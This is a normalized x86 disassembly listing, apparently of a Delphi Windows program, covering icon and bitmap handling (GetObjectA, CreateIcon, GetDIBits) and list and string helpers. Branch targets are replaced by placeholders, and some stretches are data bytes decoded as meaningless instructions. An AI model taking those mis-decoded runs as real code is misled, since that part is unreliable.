mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_426660
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_4264d4
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407e1c
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_426847
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_426318
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407e1c
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_426824
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42682b
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_40278c
retn
call sub_425a88
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_4264d4
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_4264e0
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_426890
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_425a10
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402bf8
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425cc0
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_426974
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_426890
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_4269e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_426890
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426a7d
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426a84
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_426ab4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402bf8
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402bf8
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_426aa8
xor edx edx
push ebp
push sub_426ca2
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_426974
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_426974
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_426c7b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407e1c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407e1c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407e1c
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e1c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_4269e0
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_4269e0
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c82
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40278c
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_40278c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_40278c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_40278c
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_426c82
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ca9
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_426cb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_426d00
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_426d58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_426d00
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426da1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_403134
mov edi eax
mov eax esi
call sub_403134
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426edb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426ebe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407f48
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ec5
mov al 0x1
sub_426ef4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b8b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426f3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f43
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_426f48
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_426f7c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b8b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426fc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426fce
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_426ff8
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
sub al 0x90
inc ecx
add [ esp + ecx * 4 - 0x72e7ffbf ] bl
inc ecx
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
insb
jo r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add al 0x0
add [ eax ] al
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add [ ebp + 0x706c0040 ] cl
inc edx
mov edx r-xdata
mov eax esi
call sub_427210
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_427210
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_427210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427174
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fa0
retn
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
call sub_403550
xor [ eax ] eax
les esi [ ecx + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 + 0x42 ] bh
add [ eax ] dl
add [ eax ] al
add [ ebp + 0x41 ] dh
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah al
jno r-xdata
push ebp
push sub_42716d
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4031bc
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_427210
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x8 ]
add ah ch
lea eax [ ecx ]
sub_427090
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42716d
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4031bc
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_427210
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_427210
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_427210
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_427210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427174
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fa0
retn
add esp 0xfffffff0
call sub_403550
sub_427210
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_427293
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404d24
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407fe0
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_403fd0
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_403fd0
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_418c68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42729a
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_4272a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_40442c
xor eax eax
push ebp
push sub_42732b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407fe0
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_404014
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor ebx ebx
mov edx ebx
mov eax edi
call sub_418dc4
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_404388
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ebx [ esi ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427332
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
sub_42733c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4273ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_418dc4
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_40313c
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4041e0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404388
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4273c1
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4273cc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42754b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_403f7c
mov eax [ ebp + 0x8 ]
call sub_403f7c
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_403418
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427552
lea eax [ ebp - 0x3c ]
call sub_403f7c
lea eax [ ebp - 0x10 ]
call sub_403f7c
retn
push 0x2
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_409084
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
mov ebx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404244
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_404244
mov eax [ ebp + 0x8 ]
push 0x2
mov eax [ edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_409084
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea ecx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_409084
inc [ ebp - 0xc ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xc ]
call sub_408610
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_403fd0
sub_427618
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_4276c4
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_4276c4
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_4276c4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_427698
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4031ec
mov eax [ esi + 0x8 ]
call sub_4031ec
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4276c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_418c68
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427708
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_418c68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42776c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
call sub_42772c
call sub_42774c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4277ac
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4277dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_403134
mov edx eax
mov eax [ ebx + 0xc ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4194bc
pop esi
pop ebx
retn
